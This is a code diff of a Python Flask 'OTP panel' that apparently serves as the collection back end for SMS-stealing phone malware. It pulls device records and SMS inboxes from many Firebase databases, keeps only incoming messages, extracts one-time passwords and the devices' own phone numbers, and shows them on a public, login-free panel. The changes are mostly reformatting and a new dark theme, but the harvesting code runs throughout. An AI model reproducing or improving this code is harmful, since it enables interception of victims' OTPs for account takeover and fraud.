@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-TOCXIC EAGLE OTP PANEL — v71
-Users: Public access (no login)
-Admin: Password / URL-Key protected
-BG_REFRESH_INTERVAL = 600s (auto reload every 10 min)
-FEATURE: Admin Broadcast → users receive via Mail tab
-THEME: White / Light (professional)
+TOCXIC EAGLE OTP PANEL — v71 REAL BACKEND
+Users: Public access (no login)  → sees /user panel
+Admin: Password / URL-Key protected → sees /admin/dashboard
+BG_REFRESH_INTERVAL = 600s
+Broadcast: admin sends → stored in MongoDB → users read via Mail tab
 """
 
 from flask import Flask, request, jsonify, session, redirect, url_for, Response, abort
@@ -16,7 +15,6 @@ from bson import ObjectId
 import requests, os, re, json, threading, time, hashlib
 from collections import Counter
 from datetime import datetime, timezone, timedelta
-
 
 # ============================================================
 # APP SETUP
@@ -52,10 +50,8 @@ mongo_client = db = fb_collection = settings_collection = broadcast_collection =
 _mongo_ready = False
 _mongo_lock = threading.Lock()
 
-
 def fb_hash(url):
     return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]
-
 
 def init_mongo(force=False):
     global MONGO_OK, mongo_client, db, fb_collection, settings_collection, broadcast_collection, _mongo_ready
@@ -65,14 +61,8 @@ def init_mongo(force=False):
         if _mongo_ready and not force:
             return MONGO_OK
         try:
-            mongo_client = MongoClient(
-                MONGO_URI,
-                serverSelectionTimeoutMS=4000,
-                connectTimeoutMS=4000,
-                socketTimeoutMS=8000,
-                maxPoolSize=20,
-                retryWrites=True,
-            )
+            mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=4000,
+                connectTimeoutMS=4000, socketTimeoutMS=8000, maxPoolSize=20, retryWrites=True)
             db = mongo_client["otp_panel"]
             fb_collection = db["firebases"]
             settings_collection = db["settings"]
@@ -80,7 +70,6 @@ def init_mongo(force=False):
             try:
                 broadcast_collection.create_index([("device_id", 1), ("created_at", -1)])
                 broadcast_collection.create_index([("bc_id", 1)])
-                broadcast_collection.create_index([("created_at", -1)])
             except Exception:
                 pass
             mongo_client.admin.command("ping")
@@ -93,32 +82,21 @@ def init_mongo(force=False):
             _mongo_ready = True
     return MONGO_OK
 
-
 def get_pwd(role):
-    if not MONGO_OK:
-        return DEFAULT_ADMIN_PWD
+    if not MONGO_OK: return DEFAULT_ADMIN_PWD
     try:
         doc = settings_collection.find_one({"_id": f"{role}_password"})
-        if doc and doc.get("value"):
-            return doc["value"]
-    except Exception:
-        pass
+        if doc and doc.get("value"): return doc["value"]
+    except Exception: pass
     return DEFAULT_ADMIN_PWD
 
-
 def set_pwd(role, pwd):
-    if not MONGO_OK:
-        return False
+    if not MONGO_OK: return False
     try:
-        settings_collection.update_one(
-            {"_id": f"{role}_password"},
-            {"$set": {"value": pwd, "updated_at": int(time.time())}},
-            upsert=True,
-        )
+        settings_collection.update_one({"_id": f"{role}_password"},
+            {"$set": {"value": pwd, "updated_at": int(time.time())}}, upsert=True)
         return True
-    except Exception:
-        return False
-
+    except Exception: return False
 
 # ============================================================
 # CACHE
@@ -134,89 +112,66 @@ cache = {
 # ============================================================
 # FIELD SETS
 # ============================================================
-NUM_FIELDS = {
-    "number", "phone", "phonenumber", "mobno", "mobile", "msisdn", "simnumber",
-    "sim1number", "sim2number", "line1number", "line2number", "subscriberid",
-    "devicephonenumber", "to", "from", "receiver", "sender", "address", "origin", "src",
-    "tonumber", "to_number", "fromaddress", "tophoneno", "mob_no", "senderid",
-    "destination", "dest", "recipient", "phonenum", "sim_phone_no",
-    "sim1_phone_no", "sim2_phone_no", "operatornumber", "phno"
-}
-MSG_FIELDS = {
-    "message", "body", "text", "msg", "content", "messagetext", "messagebody",
-    "sms", "smsbody", "smscontent", "smsbodytext", "lastmessage", "fullmessage",
-    "sms_message", "msgbody"
-}
-TIME_FIELDS = {
-    "timestamp", "time", "date", "receivedtime", "datetime", "createdat",
-    "senttime", "smstime", "devicetime", "date_time", "received_time",
-    "sent_time", "sms_time", "device_time", "smsdate", "receivedat", "sentat",
-    "lastmessagetime", "recvtime", "logtime", "event_time"
-}
-SENT_KEYS = {"command", "commands", "sendsms", "action", "webhookevent",
-             "send_sms", "sentsms", "outgoing", "sent_messages", "outbox"}
-INCOMING_TYPES = {"incoming", "received", "inbox", "recv", "in"}
+NUM_FIELDS = {"number","phone","phonenumber","mobno","mobile","msisdn","simnumber",
+    "sim1number","sim2number","line1number","line2number","subscriberid",
+    "devicephonenumber","to","from","receiver","sender","address","origin","src",
+    "tonumber","to_number","fromaddress","tophoneno","mob_no","senderid",
+    "destination","dest","recipient","phonenum","sim_phone_no",
+    "sim1_phone_no","sim2_phone_no","operatornumber","phno"}
+MSG_FIELDS = {"message","body","text","msg","content","messagetext","messagebody",
+    "sms","smsbody","smscontent","smsbodytext","lastmessage","fullmessage",
+    "sms_message","msgbody"}
+TIME_FIELDS = {"timestamp","time","date","receivedtime","datetime","createdat",
+    "senttime","smstime","devicetime","date_time","received_time",
+    "sent_time","sms_time","device_time","smsdate","receivedat","sentat",
+    "lastmessagetime","recvtime","logtime","event_time"}
+SENT_KEYS = {"command","commands","sendsms","action","webhookevent",
+    "send_sms","sentsms","outgoing","sent_messages","outbox"}
+INCOMING_TYPES = {"incoming","received","inbox","recv","in"}
 
 # ============================================================
 # HELPERS
 # ============================================================
-def digits_only(s):
-    return re.sub(r"\D", "", str(s) if s is not None else "")
-
+def digits_only(s): return re.sub(r"\D", "", str(s) if s is not None else "")
 
 def normalize_number(n):
     d = digits_only(n)
     return d[-10:] if len(d) >= 10 else d
 
-
 def is_clean_phone_number(s):
-    if not s or not isinstance(s, str):
-        return False
+    if not s or not isinstance(s, str): return False
     s = s.strip()
-    if not s or len(s) > 25:
-        return False
-    if any(c in s for c in ("|", ":", "/", "\\", "T", "Z")):
-        return False
-    if any(w in s.lower() for w in ("otp", "password", "http", "@", "#", "msg", "am", "pm")):
-        return False
-    if not re.fullmatch(r"[\+\d\s\-]+", s):
-        return False
+    if not s or len(s) > 25: return False
+    if any(c in s for c in ("|", ":", "/", "\\", "T", "Z")): return False
+    if any(w in s.lower() for w in ("otp","password","http","@","#","msg","am","pm")): return False
+    if not re.fullmatch(r"[\+\d\s\-]+", s): return False
     return 10 <= len(digits_only(s)) <= 15
 
-
 def extract_real_numbers_from_message(message):
-    if not message:
-        return []
+    if not message: return []
     text = re.sub(r'\d{3,4}[Xx*]{2,6}\d{2,4}', ' ', str(message))
     found, seen = [], set()
     for m in re.finditer(r'\+91[\s\-]?([6-9]\d{9})', text):
         n = m.group(1)
-        if n not in seen:
-            seen.add(n); found.append(n)
+        if n not in seen: seen.add(n); found.append(n)
     for m in re.finditer(r'(?<!\d)([6-9]\d{9})(?!\d)', text):
         n = m.group(1)
-        if n not in seen:
-            seen.add(n); found.append(n)
+        if n not in seen: seen.add(n); found.append(n)
     return found
 
-
 def parse_date_string(s):
-    if not s or not isinstance(s, str):
-        return 0
+    if not s or not isinstance(s, str): return 0
     try:
         m = re.match(r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)",
                      s.strip(), re.IGNORECASE)
-        if not m:
-            return 0
+        if not m: return 0
         day, month, year, hour, minute, ap = m.groups()
         hour = int(hour)
         if ap.lower() == "pm" and hour != 12: hour += 12
         if ap.lower() == "am" and hour == 12: hour = 0
         dt = datetime(int(year), int(month), int(day), hour, int(minute), tzinfo=IST)
         return int(dt.timestamp())
-    except Exception:
-        return 0
-
+    except Exception: return 0
 
 def collect_all_numbers(obj, found=None, depth=0):
     if found is None: found = []
@@ -228,16 +183,13 @@ def collect_all_numbers(obj, found=None, depth=0):
             if isinstance(v, (dict, list)):
                 collect_all_numbers(v, found, depth + 1)
     elif isinstance(obj, list):
-        for item in obj:
-            collect_all_numbers(item, found, depth + 1)
+        for item in obj: collect_all_numbers(item, found, depth + 1)
     return found
-
 
 def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
     if found is None: found = []
     if depth > 10: return found
     if any(k in parent_key.lower() for k in SENT_KEYS): return found
-
     if isinstance(obj, dict):
         kl = {k.lower() for k in obj.keys()}
         if kl & MSG_FIELDS:
@@ -249,16 +201,16 @@ def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
             to_val = from_val = num = None
             for k in obj.keys():
                 kk = k.lower()
-                if kk in ("to", "recipient", "tonumber", "to_number", "receiver", "destination", "dest"):
+                if kk in ("to","recipient","tonumber","to_number","receiver","destination","dest"):
                     to_val = obj[k]
-                elif kk in ("from", "sender", "fromnumber", "from_number", "address",
-                            "originatingaddress", "senderaddress", "originator", "source", "src"):
+                elif kk in ("from","sender","fromnumber","from_number","address",
+                            "originatingaddress","senderaddress","originator","source","src"):
                     from_val = obj[k]
                 elif kk in NUM_FIELDS and num is None:
                     num = obj[k]
             date_str = None
             for k in obj.keys():
-                if k.lower() in ("datetime", "date_time", "date", "datetimestr"):
+                if k.lower() in ("datetime","date_time","date","datetimestr"):
                     v = obj[k]
                     if isinstance(v, str) and ("|" in v or "am" in v.lower() or "pm" in v.lower()):
                         date_str = v; break
@@ -269,22 +221,20 @@ def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
                     try:
                         ts = int(ts_raw)
                         if ts > 1e12: ts = ts // 1000
-                    except Exception:
-                        ts = 0
+                    except Exception: ts = 0
             msg_id = obj.get("id")
             if not ts and msg_id:
                 try:
                     mid = int(msg_id)
                     if mid > 1e12: ts = mid // 1000
                     elif mid > 1e9: ts = mid
-                except Exception:
-                    pass
+                except Exception: pass
             if not ts: ts = parent_ts
             msg_type = str(obj.get("type", "")).lower().strip()
             is_sended = obj.get("isSended") if "isSended" in obj else obj.get("isSent")
             keep = True
             if msg_type in INCOMING_TYPES: keep = True
-            elif msg_type in ("sent", "outgoing", "outbox", "send", "sentmessage", "sentsms"): keep = False
+            elif msg_type in ("sent","outgoing","outbox","send","sentmessage","sentsms"): keep = False
             elif is_sended is True: keep = False
             elif is_sended is False: keep = True
             elif from_val and not to_val: keep = True
@@ -306,14 +256,12 @@ def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
                 tk = int(k)
                 if tk > 1e12: child_ts = tk // 1000
                 elif tk > 1e9: child_ts = tk
-            except Exception:
-                pass
+            except Exception: pass
             collect_all_messages(v, found, depth + 1, child_ts, k)
     elif isinstance(obj, list):
         for item in obj:
             collect_all_messages(item, found, depth + 1, parent_ts, parent_key)
     return found
-
 
 def extract_otp(text):
     if not text: return ""
@@ -326,24 +274,20 @@ def extract_otp(text):
     if m: return m.group(1)
     return ""
 
-
 def numbers_match(a, b):
     na, nb = normalize_number(a), normalize_number(b)
     return na == nb and na != ""
-
 
 def is_online(info):
     if not isinstance(info, dict): return False
     if info.get("status") is True or info.get("isOnline") is True: return True
     if info.get("online") is True or info.get("connected") is True: return True
-    if info.get("status") in ("online", "active", 1): return True
+    if info.get("status") in ("online","active",1): return True
     if info.get("lastSeen"):
         try:
             if time.time() - int(info["lastSeen"]) < 600: return True
-        except Exception:
-            pass
+        except Exception: pass
     return False
-
 
 def find_real_number_from_messages(all_msgs):
     counter = Counter()
@@ -355,17 +299,16 @@ def find_real_number_from_messages(all_msgs):
         if m.get("type") != "received": continue
         for n in extract_real_numbers_from_message(m.get("message", "")):
             if n in senders: continue
-            if n.startswith(("1800", "1900", "1991")): continue
+            if n.startswith(("1800","1900","1991")): continue
             counter[n] += 1
     return counter.most_common(10)
-
 
 def parse_device_full(dev_data, dev_id):
     online = is_online(dev_data)
     name = dev_id[:16]
-    for f in ["deviceName", "device_name", "name", "model", "deviceModel", "brand",
-              "manufacturer", "phoneName", "phoneModel", "deviceInfo", "productName",
-              "hardware", "deviceBrand"]:
+    for f in ["deviceName","device_name","name","model","deviceModel","brand",
+              "manufacturer","phoneName","phoneModel","deviceInfo","productName",
+              "hardware","deviceBrand"]:
         v = dev_data.get(f)
         if v and isinstance(v, str) and v.strip():
             name = v.strip()[:25]; break
@@ -404,12 +347,10 @@ def parse_device_full(dev_data, dev_id):
         "total_otp": sum(1 for m in unique if extract_otp(m.get("message", ""))),
     }
 
-
 # ============================================================
 # HTTP SESSION
 # ============================================================
 _tls = threading.local()
-
 
 def _sess():
     if not hasattr(_tls, "s"):
@@ -418,7 +359,6 @@ def _sess():
         _tls.s = s
     return _tls.s
 
-
 def try_json(url, timeout=FETCH_TIMEOUT):
     try:
         r = _sess().get(url, timeout=timeout)
@@ -426,24 +366,20 @@ def try_json(url, timeout=FETCH_TIMEOUT):
         t = r.text.strip()
         if not t or t == "null": return None
         return json.loads(t)
-    except Exception:
-        return None
-
+    except Exception: return None
 
 # ============================================================
 # FETCH
 # ============================================================
 def fetch_device_ids(fb_url):
     base = fb_url.rstrip("/")
-    for path in ["/clients.json?shallow=true", "/clients.json",
-                 "/devices.json?shallow=true", "/devices.json",
-                 "/users.json?shallow=true", "/users.json",
-                 "/data.json?shallow=true", "/data.json"]:
+    for path in ["/clients.json?shallow=true","/clients.json",
+                 "/devices.json?shallow=true","/devices.json",
+                 "/users.json?shallow=true","/users.json",
+                 "/data.json?shallow=true","/data.json"]:
         d = try_json(base + path)
-        if isinstance(d, dict) and d:
-            return list(d.keys())
+        if isinstance(d, dict) and d: return list(d.keys())
     return []
-
 
 def fetch_device_data(fb_url, dev_id):
     base = fb_url.rstrip("/")
@@ -453,22 +389,20 @@ def fetch_device_data(fb_url, dev_id):
         if isinstance(d, dict): return d
     return None
 
-
 SMS_PATHS = [
-    "/messages/{id}.json", "/clients/{id}/messages.json", "/clients/{id}/sms.json",
-    "/clients/{id}/smsInbox.json", "/clients/{id}/inbox.json",
-    "/clients/{id}/receivedSms.json", "/clients/{id}/received.json",
-    "/clients/{id}/incoming.json", "/clients/{id}/smsList.json",
-    "/clients/{id}/receivedMessages.json", "/clients/{id}/messageList.json",
-    "/clients/{id}/allSms.json", "/clients/{id}/allMessages.json",
-    "/clients/{id}/history.json", "/clients/{id}/logs.json",
-    "/devices/{id}/messages.json", "/devices/{id}/sms.json",
-    "/devices/{id}/inbox.json", "/devices/{id}/receivedSms.json",
-    "/users/{id}/messages.json", "/users/{id}/sms.json",
-    "/data/{id}/messages.json", "/sms/{id}.json", "/inbox/{id}.json",
-    "/received/{id}.json", "/incoming/{id}.json", "/messages/{id}/sms.json",
+    "/messages/{id}.json","/clients/{id}/messages.json","/clients/{id}/sms.json",
+    "/clients/{id}/smsInbox.json","/clients/{id}/inbox.json",
+    "/clients/{id}/receivedSms.json","/clients/{id}/received.json",
+    "/clients/{id}/incoming.json","/clients/{id}/smsList.json",
+    "/clients/{id}/receivedMessages.json","/clients/{id}/messageList.json",
+    "/clients/{id}/allSms.json","/clients/{id}/allMessages.json",
+    "/clients/{id}/history.json","/clients/{id}/logs.json",
+    "/devices/{id}/messages.json","/devices/{id}/sms.json",
+    "/devices/{id}/inbox.json","/devices/{id}/receivedSms.json",
+    "/users/{id}/messages.json","/users/{id}/sms.json",
+    "/data/{id}/messages.json","/sms/{id}.json","/inbox/{id}.json",
+    "/received/{id}.json","/incoming/{id}.json","/messages/{id}/sms.json",
 ]
-
 
 def fetch_messages_primary(fb_url, dev_id):
     base = fb_url.rstrip("/")
@@ -482,7 +416,6 @@ def fetch_messages_primary(fb_url, dev_id):
             seen.add(h); all_msgs.append(m)
     all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
     return all_msgs
-
 
 def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
     base = fb_url.rstrip("/")
@@ -502,7 +435,6 @@ def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
         seen.add(h); all_msgs.append(m)
     all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
     return all_msgs[:MAX_SMS_PER_NUMBER]
-
 
 def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
     out = []
@@ -554,7 +486,6 @@ def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
         out.append(dev)
     return out
 
-
 def merge_numbers_into_cache(devices):
     with cache["lock"]:
         for dev in devices:
@@ -562,8 +493,7 @@ def merge_numbers_into_cache(devices):
             for sim in dev.get("sims", []):
                 num = sim["number"]
                 key = num if num.startswith("UNKNOWN-") else normalize_number(num)
-                if not key or (not num.startswith("UNKNOWN-") and len(key) != 10):
-                    continue
+                if not key or (not num.startswith("UNKNOWN-") and len(key) != 10): continue
                 msgs = dev.get("per_number", {}).get(num, [])
                 otp_c = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                 if key not in cache["numbers_map"]:
@@ -598,17 +528,14 @@ def merge_numbers_into_cache(devices):
             "otp_rate": int((total_otp / total_msg) * 100) if total_msg > 0 else 0,
         }
 
-
 def fetch_fb_stats():
     init_mongo()
     if not MONGO_OK: return
     try:
         fbs = list(fb_collection.find({}))
-    except Exception:
-        return
+    except Exception: return
     results = {}
     sem = threading.Semaphore(MAX_PARALLEL)
-
     def worker(fb):
         with sem:
             url = fb.get("url", "")
@@ -622,7 +549,6 @@ def fetch_fb_stats():
             except Exception as e:
                 print(f"fb_stats err {url}: {e}")
                 results[fid] = {"online": 0, "offline": 0, "devices": 0}
-
     ts = []
     for fb in fbs:
         t = threading.Thread(target=worker, args=(fb,), daemon=True)
@@ -632,18 +558,15 @@ def fetch_fb_stats():
         cache["fb_stats"] = results
         cache["fb_stats_time"] = time.time()
 
-
 def fetch_all_devices():
     init_mongo()
     if not MONGO_OK: return
     try:
         fbs = list(fb_collection.find({}))
-    except Exception:
-        return
+    except Exception: return
     with cache["lock"]:
         cache["progress"] = {"done": 0, "total": len(fbs)}
     sem = threading.Semaphore(MAX_PARALLEL)
-
     def worker(fb):
         with sem:
             url = fb.get("url", "")
@@ -655,13 +578,11 @@ def fetch_all_devices():
             except Exception as e:
                 print(f"worker err {url}: {e}")
             with cache["lock"]: cache["progress"]["done"] += 1
-
     ts = []
     for fb in fbs:
         t = threading.Thread(target=worker, args=(fb,), daemon=True)
         t.start(); ts.append(t)
     for t in ts: t.join(timeout=90)
-
 
 def refresh_cache():
     with cache["lock"]:
@@ -679,19 +600,15 @@ def refresh_cache():
     finally:
         with cache["lock"]: cache["loading"] = False
 
-
 def bg_refresher():
     time.sleep(5)
     while True:
-        try:
-            refresh_cache()
-        except Exception as e:
-            print(f"BG: {e}")
+        try: refresh_cache()
+        except Exception as e: print(f"BG: {e}")
         time.sleep(BG_REFRESH_INTERVAL)
 
-
 # ============================================================
-# ADMIN AUTH
+# AUTH
 # ============================================================
 def admin_required(f):
     @wraps(f)
@@ -703,434 +620,360 @@ def admin_required(f):
         return f(*args, **kwargs)
     return wrapper
 
-
 # ============================================================
-# SHARED STYLES — LIGHT THEME
+# SHARED CSS (from index.html — DARK THEME)
 # ============================================================
-MOBILE_CSS = """
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;
-font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,system-ui,sans-serif}
-html,body{overscroll-behavior-y:contain}
-input,button,textarea,select{font-size:16px !important;-webkit-appearance:none}
-button{touch-action:manipulation;cursor:pointer}
-"""
-
 ORBITRON = """
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&family=JetBrains+Mono:wght@400;600&family=Orbitron:wght@500;600;700;800;900&display=swap" rel="stylesheet">
 """
 
-BRAND_CSS = """
-:root{--red:#E40000;--red2:#FF4D4D;--blue:#0F3CC9;--blue2:#3B82F6;
---grad:linear-gradient(135deg,#E40000 0%,#0F3CC9 100%);
---grad-r:linear-gradient(135deg,#E40000 0%,#FF4D4D 100%);
---grad-b:linear-gradient(135deg,#0F3CC9 0%,#3B82F6 100%);
---grad-amber:linear-gradient(135deg,#f59e0b 0%,#f97316 100%);
---grad-green:linear-gradient(135deg,#12b76a 0%,#32d583 100%);
---bg:#f5f6fa;--card:#fff;--text:#101828;--muted:#667085;--muted2:#98a2b3;
---sep:rgba(16,24,40,.08);--ok:#12b76a;--err:#f04438;--warn:#f79009;
---purple:#7c3aed;
---shadow-sm:0 1px 3px rgba(16,24,40,.06);
---shadow-md:0 2px 10px rgba(16,24,40,.06);
---shadow-lg:0 12px 32px rgba(16,24,40,.12)}
-html,body{-webkit-font-smoothing:antialiased}
-body{background:var(--bg);color:var(--text);min-height:100vh;padding:0 0 80px}
-.topbar{background:var(--card);padding:12px 16px;display:flex;align-items:center;
-justify-content:space-between;position:sticky;top:0;z-index:100;
-box-shadow:0 1px 3px rgba(16,24,40,.06);flex-wrap:wrap;gap:10px;
-padding-top:calc(12px + env(safe-area-inset-top));border-bottom:1px solid var(--sep)}
-.brand{display:flex;align-items:center;gap:10px;
-font-family:'Orbitron',sans-serif;font-weight:800;font-size:14px;letter-spacing:1px}
-.brand .eagle{font-size:22px;filter:drop-shadow(0 2px 6px rgba(228,0,0,.35))}
-.brand .name{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
-.brand .sub{color:var(--muted2);font-size:9px;letter-spacing:2px;display:block;margin-top:-2px}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
-.nav-link{padding:9px 14px;border-radius:12px;text-decoration:none;font-size:12px;
-font-weight:700;color:#475467;background:rgba(16,24,40,.05);transition:.2s;
-white-space:nowrap;min-height:40px;display:inline-flex;align-items:center}
-.nav-link.active{background:var(--grad);color:#fff;box-shadow:0 4px 12px rgba(228,0,0,.25)}
-.nav-link.otp{background:rgba(18,183,106,.12);color:#05603a}
-.nav-link.otp.active{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
-.nav-link.sec{background:rgba(247,144,9,.14);color:#93370d}
-.nav-link.sec.active{background:linear-gradient(135deg,#f79009,#fdb022);color:#fff}
-.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:700;
-padding:7px 12px;border-radius:20px}
-.conn.online{color:#05603a;background:rgba(18,183,106,.14)}
-.conn.offline{color:#b42318;background:rgba(240,68,56,.12)}
-.conn.loading{color:#93370d;background:rgba(247,144,9,.14)}
-.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
-.conn.online .dot{animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
-.container{max-width:920px;margin:0 auto;padding:16px}
-.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px}
-.stat{background:var(--card);border-radius:18px;padding:18px;
-box-shadow:0 2px 10px rgba(16,24,40,.05);border:1px solid var(--sep)}
-.stat .label{font-family:'Orbitron',sans-serif;font-size:10px;color:var(--muted);
-font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px}
-.stat .value{font-family:'Orbitron',sans-serif;font-size:32px;font-weight:800;line-height:1}
-.stat.total .value{color:#007aff}
-.stat.online .value{color:#12b76a}
-.stat.offline .value{color:#E40000}
-.stat.otp .value{color:#7c3aed}
-.quick{background:var(--card);border-radius:18px;padding:16px;margin-bottom:14px;
-display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;
-border:1px solid var(--sep)}
-.quick .info{font-size:13px;color:var(--muted)}
-.quick .info b{color:var(--text);font-size:15px;font-family:'Orbitron',sans-serif;font-weight:800}
-.quick .btns{display:flex;gap:8px;flex-wrap:wrap}
-.quick a,.quick button{padding:10px 18px;background:var(--grad);color:#fff;text-decoration:none;
-border-radius:12px;font-size:12px;font-weight:700;border:none;font-family:inherit;
-transition:.2s;min-height:42px;display:inline-flex;align-items:center;gap:6px}
-.quick button.green{background:linear-gradient(135deg,#12b76a,#32d583)}
-.quick button.amber{background:var(--grad-amber)}
-.num-filter-bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
-.num-filter-btn{flex:1;min-width:100px;padding:14px 12px;font-size:13px;font-weight:700;
-border-radius:14px;border:1px solid var(--sep);background:var(--card);color:var(--muted);
-cursor:pointer;transition:.2s;display:flex;align-items:center;justify-content:center;gap:8px;
-font-family:inherit;min-height:48px}
-.num-filter-btn.active{color:#fff;border-color:transparent}
-.num-filter-btn#nf-all.active{background:var(--grad)}
-.num-filter-btn#nf-online.active{background:linear-gradient(135deg,#12b76a,#32d583)}
-.num-filter-btn#nf-offline.active{background:var(--grad-r)}
-.num-filter-btn .cnt{background:rgba(16,24,40,.08);padding:2px 9px;border-radius:10px;
-font-size:11px;font-weight:800;font-family:'Orbitron',sans-serif;min-width:24px;text-align:center}
-.num-filter-btn.active .cnt{background:rgba(255,255,255,.28);color:#fff}
-.list-header{display:flex;justify-content:space-between;align-items:center;
-margin-bottom:12px;padding:0 4px}
-.list-header h2{font-size:15px;font-weight:800;color:#344054;display:flex;align-items:center;gap:8px}
-.list-header .count{font-size:12px;color:var(--muted);background:rgba(16,24,40,.06);
-padding:4px 12px;border-radius:20px;font-weight:800;font-family:'Orbitron',sans-serif}
-.search-box{margin-bottom:14px}
-.search-box input{width:100%;padding:14px 18px;border-radius:14px;border:1px solid var(--sep);
-background:var(--card);font-size:15px;outline:none;color:var(--text)}
-.search-box input:focus{border-color:var(--red);box-shadow:0 0 0 4px rgba(228,0,0,.12)}
-.num-card{background:var(--card);border-radius:18px;padding:16px;margin-bottom:10px;
-display:flex;align-items:center;gap:14px;cursor:pointer;transition:.15s;
-border:1px solid var(--sep)}
-.num-card.offline{opacity:.78}
-.num-icon{width:46px;height:46px;border-radius:14px;display:flex;align-items:center;
-justify-content:center;font-size:22px;flex-shrink:0;background:linear-gradient(135deg,#d1fae5,#a7f3d0)}
-.num-icon.red{background:linear-gradient(135deg,#fee4e2,#fecaca)}
-.num-icon.gray{background:linear-gradient(135deg,#eaecf0,#d0d5dd)}
-.num-info{flex:1;min-width:0}
-.num-title{font-size:15px;font-weight:800;color:var(--text);overflow:hidden;
-text-overflow:ellipsis;white-space:nowrap;font-family:'Orbitron',sans-serif;letter-spacing:.5px}
-.num-title.unknown{color:var(--muted2);font-style:italic}
-.num-title .confidence-badge{font-size:10px;background:rgba(18,183,106,.15);color:#05603a;
-padding:2px 6px;border-radius:8px;margin-left:4px;font-weight:800}
-.num-sub{font-size:11px;color:var(--muted);margin-top:6px;display:flex;gap:6px;flex-wrap:wrap}
-.num-sub .pill{background:rgba(16,24,40,.06);padding:3px 9px;border-radius:8px;color:#344054;
-font-size:10px;font-weight:700}
-.num-sub .pill.otp{background:rgba(15,60,201,.12);color:#0f3cc9}
-.badge-online{display:flex;align-items:center;gap:6px;font-size:12px;color:#05603a;
-font-weight:800;flex-shrink:0}
-.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#12b76a}
-.badge-offline{display:flex;align-items:center;gap:6px;font-size:12px;color:#b42318;
-font-weight:800;flex-shrink:0}
-.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#E40000}
-.arrow{color:var(--muted2);font-size:22px;font-weight:300}
-.card-actions{display:flex;gap:6px;flex-shrink:0}
-.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f79009,#fdb022);color:#fff;
-border:none;border-radius:8px;font-size:11px;font-weight:800;cursor:pointer;
-min-height:36px;display:inline-flex;align-items:center}
-.inbox-header{background:var(--card);border-radius:18px;padding:18px;margin-bottom:14px;
-border:1px solid var(--sep)}
-.inbox-top{display:flex;align-items:center;gap:14px;margin-bottom:14px}
-.back-btn{background:rgba(16,24,40,.06);border:none;width:42px;height:42px;border-radius:12px;
-font-size:18px;cursor:pointer;color:#344054;font-weight:700;text-decoration:none;
-display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
-.inbox-num{font-size:17px;font-weight:800;color:var(--text);font-family:'Orbitron',sans-serif}
-.inbox-num.unknown{color:var(--muted2);font-style:italic}
-.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#05603a;
-font-weight:800;margin-top:4px}
-.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#12b76a}
-.inbox-status.offline{color:#b42318}
-.inbox-status.offline .dot{background:#E40000}
-.inbox-meta{font-size:11px;color:var(--muted);display:flex;justify-content:space-between;
-align-items:center;padding-top:12px;border-top:1px solid var(--sep)}
-.refresh-icon{cursor:pointer;font-size:20px;color:var(--muted2);padding:6px;
-min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
-.sms-list{background:var(--card);border-radius:18px;overflow:hidden;border:1px solid var(--sep)}
-.sms-item{padding:18px 20px;border-bottom:1px solid var(--sep);position:relative}
-.sms-item:last-child{border-bottom:none}
-.sms-item.fresh{background:linear-gradient(90deg,rgba(18,183,106,.08),transparent 45%)}
-.sms-item.otp-item{background:linear-gradient(90deg,rgba(15,60,201,.06),transparent 45%)}
-.sms-item.mail-item{background:linear-gradient(90deg,rgba(245,158,11,.08),transparent 45%);
-border-left:3px solid #f59e0b}
-.sms-item .msg-type-badge{position:absolute;top:12px;right:12px;font-size:9px;
+DARK_CSS = """
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#08090b;--bg2:#0d0f12;--bg3:#13151a;--bg4:#1a1d24;
+  --border:#1e2128;--border2:#262a34;
+  --text:#e8eaf0;--text2:#9aa0b0;--text3:#4a5068;
+  --red:#E40000;--red2:#FF4D4D;--blue:#0F3CC9;--blue2:#3B82F6;
+  --grad:linear-gradient(135deg,#E40000 0%,#0F3CC9 100%);
+  --grad-r:linear-gradient(135deg,#E40000 0%,#FF4D4D 100%);
+  --green:#22c55e;--purple:#a855f7;--amber:#f59e0b;
+  --radius:10px;--radius2:14px;
+}
